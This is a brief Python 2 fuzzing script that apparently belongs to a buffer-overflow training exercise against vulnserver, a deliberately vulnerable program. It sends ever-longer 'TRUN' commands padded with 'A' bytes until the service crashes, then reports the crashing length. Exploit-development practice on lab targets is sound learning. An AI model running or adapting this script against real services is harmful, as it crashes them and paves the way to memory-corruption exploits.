#!/usr/bin/env python2

"""
Determines the length of bytes necessary to trigger a buffer overflow in vulnserver
"""

import sys, socket
from time import sleep
from options import HOST, PORT

buffer = 'A' * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        cmd = ('TRUN /.:/' + buffer)
        # print("SEND "+cmd)
        s.send(cmd)
        print("sent %d bytes" % len(buffer))
        s.close()
        sleep(1)

        buffer = buffer + ("A" * 100)
    except:
        print("crashed at %d bytes" % len(buffer))
        # print(e)
        sys.exit()
